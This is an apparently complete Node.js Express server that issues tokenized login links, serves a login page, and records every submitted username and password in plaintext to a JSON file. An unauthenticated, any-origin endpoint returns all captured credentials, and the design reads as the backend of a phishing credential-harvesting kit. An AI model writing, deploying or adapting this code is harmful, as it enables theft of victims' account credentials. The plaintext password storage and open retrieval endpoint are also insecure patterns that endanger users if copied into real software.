const express = require('express');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// Enable CORS for local files (dashboard opened via file://)
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');  // Allows any origin; restrict if needed.
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

// Middleware to parse JSON and URL-encoded bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// File to store login sessions and requests
const loginsFile = path.join(__dirname, 'logins.json');

// Helper: Read logins, initializing file if needed.
function readLogins() {
  if (!fs.existsSync(loginsFile)) {
    fs.writeFileSync(loginsFile, JSON.stringify({}), 'utf8');
  }
  const data = fs.readFileSync(loginsFile, 'utf8');
  return JSON.parse(data);
}

// Helper: Write logins.
function writeLogins(data) {
  fs.writeFileSync(loginsFile, JSON.stringify(data, null, 2), 'utf8');
}

// Endpoint to generate a new login link.
app.get('/generate-login', (req, res) => {
  const loginapi = uuidv4();
  const logins = readLogins();
  logins[loginapi] = { requests: [] };
  writeLogins(logins);
  // Construct the URL for the login page.
  const loginUrl = `${req.protocol}://${req.get('host')}/login.html?loginapi=${loginapi}`;
  res.json({ loginUrl, loginapi });
});

// Serve the login.html file for login page (do not serve dashboard.html)
app.get('/login.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

// Endpoint to handle login submissions from login.html.
app.post('/submit', (req, res) => {
  const { loginapi, username, password } = req.body;
  if (!loginapi || !username || !password) {
    return res.status(400).send('Missing required fields.');
  }
  const logins = readLogins();
  if (!logins[loginapi]) {
    return res.status(400).send('Invalid login API token.');
  }
  // Append login info with a timestamp.
  logins[loginapi].requests.push({
    username,
    password,
    timestamp: new Date()
  });
  writeLogins(logins);
  res.send('Login information submitted successfully.');
});

// API endpoint for retrieving all login requests.
app.get('/get-login-requests', (req, res) => {
  const logins = readLogins();
  res.json(logins);
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
